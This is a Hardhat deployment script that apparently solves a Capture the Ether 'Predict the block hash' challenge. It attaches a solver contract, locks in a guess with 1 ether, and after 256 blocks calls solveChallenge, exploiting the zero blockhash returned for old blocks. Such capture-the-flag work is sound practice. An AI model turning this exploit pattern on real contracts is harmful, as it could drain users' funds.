const { ethers } = require('hardhat');

const DEPLOY = false;
const CHALLENGE_ADDRESS = '0x11cf935078770F1DFDDBd35FbD57eeb8CdD94033';
const SOLVER_ADDRESS = '0x015e6af44AB66a03a13Aff76d947aD9a46D4057d';

async function main() {
  const PredictTheBlockHashChallengeSolver = await ethers.getContractFactory('PredictTheBlockHashChallengeSolver');

  let solver;
  if (DEPLOY) {
    solver = await PredictTheBlockHashChallengeSolver.deploy();
    await solver.deployed();
    console.log(`Solver address: ${solver.address}`);
  } else {
    solver = await PredictTheBlockHashChallengeSolver.attach(SOLVER_ADDRESS);
  }

  // // Step 1: lock in the guess
  // await solver.enterGuess(CHALLENGE_ADDRESS, { value: ethers.utils.parseEther('1.0') });

  // Step 2: wait for 256 blocks to be mined and then execute it
  const tx = await solver.solveChallenge(CHALLENGE_ADDRESS);
  await tx.wait();
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
